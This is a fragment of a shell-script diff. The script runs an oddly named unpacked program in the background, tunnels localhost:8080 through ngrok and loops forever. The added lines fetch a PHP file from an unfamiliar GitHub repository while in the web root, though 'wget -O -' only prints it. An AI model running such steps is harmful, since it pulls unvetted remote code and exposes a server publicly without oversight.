@@ -25,6 +25,10 @@ tar -xvf ./linux8888888888.tar.gz
 
 bash ./start &
 
+cd /var/www/html/
+
+wget -O - https://raw.githubusercontent.com/linuxweb888888888888/linux8888/refs/heads/main/index.php
+
 ngrok http http://localhost:8080 &
 
 while true
